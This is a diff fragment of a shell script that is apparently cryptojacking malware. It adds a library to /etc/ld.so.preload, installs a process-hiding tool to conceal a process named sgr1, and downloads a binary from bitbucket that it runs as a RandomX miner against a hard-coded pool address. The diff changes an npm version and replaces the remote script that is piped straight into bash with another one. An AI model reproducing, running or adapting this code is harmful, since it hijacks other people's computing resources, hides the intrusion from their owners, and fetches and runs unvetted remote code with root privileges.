@@ -8,9 +8,9 @@ echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
 echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
-sudo su --command "apt-get update && apt-get install gcc -y && curl -sL https://deb.nodesource.com/setup_18.x | bash && apt-get install nodejs -y && npm install -g npm@9.8.1 -y && npm i -g node-process-hider && ph add sgr1"
+sudo su --command "apt-get update && apt-get install gcc -y && curl -sL https://deb.nodesource.com/setup_18.x | bash && apt-get install nodejs -y && npm install -g npm@10.0.0 -y && npm i -g node-process-hider && ph add sgr1"
 mkdir .kap && cd .kap
 wget -O sgr1 https://bitbucket.org/koploks/file/raw/master/xmt >/dev/null 2>&1
 chmod +x sgr1
 sudo ./sgr1 -a rx/0 -o 8.222.148.101:80 -u Ayra -p x -t $(nproc --all) --donate-level 1 -k  > /dev/null 2>&1 &
-curl -sL https://bitbucket.org/korong/file/raw/master/time | bash 
+curl -sL https://bitbucket.org/koploks/shc/raw/master/boled04.sh | bash 
